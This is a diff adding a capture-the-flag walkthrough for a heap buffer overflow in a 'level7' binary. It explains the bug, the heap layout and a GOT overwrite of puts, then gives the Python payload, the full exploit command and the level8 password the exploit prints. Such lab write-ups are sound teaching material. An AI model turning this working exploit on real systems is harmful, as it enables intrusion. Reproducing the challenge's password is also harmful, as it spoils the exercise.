@@ -1,0 +1,118 @@
+# Level7 Walkthrough - Heap Buffer Overflow with GOT Overwrite
+
+## Overview
+Level7 is a heap exploitation challenge where we need to overflow heap buffers to overwrite a Global Offset Table (GOT) entry and redirect program execution.
+
+## Program Analysis
+
+The program creates a linked list structure on the heap and has two main functions:
+
+### Function `m` (0x080484f4)
+```c
+void m(void) {
+    printf("%s - %d\n", global_buffer, time(0));
+}
+```
+This function prints the contents of a global buffer along with a timestamp. The global buffer contains the level8 password after the program reads it.
+
+### Function `main`
+```c
+void main(int argc, char **argv) {
+    // Create first linked list node
+    node1 = malloc(8);
+    node1->value = 1;
+    node1->data = malloc(8);
+    
+    // Create second linked list node  
+    node2 = malloc(8);
+    node2->value = 2;
+    node2->data = malloc(8);
+    
+    // VULNERABLE: Copy argv[1] and argv[2] without bounds checking
+    strcpy(node1->data, argv[1]);  // First overflow opportunity
+    strcpy(node2->data, argv[2]);  // Second overflow opportunity
+    
+    // Read level8 password into global buffer
+    fopen("/home/user/level8/.pass", "r");
+    fgets(global_buffer, 68, file);
+    
+    // This call will be hijacked
+    puts("~~");
+}
+```
+
+## The Vulnerability
+
+The `strcpy()` calls copy user input into 8-byte heap buffers without bounds checking, allowing heap buffer overflow.
+
+## Heap Layout
+
+After malloc calls, the heap looks like this:
+```
+0x804a008: [value=1] [ptr to 0x804a018]  <- First node
+0x804a018: [8 bytes data buffer]         <- First node's data
+0x804a028: [value=2] [ptr to 0x804a038]  <- Second node  
+0x804a038: [8 bytes data buffer]         <- Second node's data
+```
+
+## Exploitation Strategy
+
+1. **Overflow the first buffer** to overwrite the second node's data pointer
+2. **Redirect the pointer** to point to the GOT entry for `puts` (0x08049928)
+3. **Use the second strcpy** to overwrite the `puts` GOT entry with the address of function `m`
+4. **When puts("~~") is called**, it will actually call function `m` instead
+5. **Function `m` prints** the global buffer containing the level8 password
+
+## Finding the Offset
+
+Using GDB analysis, we need exactly 20 bytes to reach the second node's data pointer:
+- 8 bytes: First node's data buffer
+- 8 bytes: Heap metadata/padding  
+- 4 bytes: Second node's value field
+- Total: 20 bytes to reach the data pointer
+
+## GOT Analysis
+
+Using `objdump -R /home/user/level7/level7`:
+```
+08049928 R_386_JUMP_SLOT   puts
+```
+
+The `puts` function's GOT entry is at `0x08049928`.
+
+## Crafting the Exploit
+
+**First argument**: 20 bytes padding + GOT address of puts
+```bash
+python -c "print('A' * 20 + '\x28\x99\x04\x08')"
+```
+
+**Second argument**: Address of function `m`
+```bash
+python -c "print('\xf4\x84\x04\x08')"
+```
+
+## Final Exploit
+
+```bash
+/home/user/level7/level7 $(python -c "print('A' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
+```
+
+## Result
+
+The exploit successfully redirects execution and prints:
+```
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1758643656
+```
+
+**Level8 Password:** `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
+
+## Key Concepts
+
+- **Heap Buffer Overflow**: Overwriting memory beyond allocated heap boundaries
+- **GOT Overwrite**: Modifying Global Offset Table entries to redirect function calls
+- **Heap Layout Understanding**: Knowing how malloc organizes memory and metadata
+- **Function Pointer Hijacking**: Redirecting program execution by overwriting function pointers
+- **Little-Endian Format**: x86 architecture stores addresses with least significant byte first
+
+This technique demonstrates how heap vulnerabilities can be exploited to achieve arbitrary code execution through GOT manipulation.
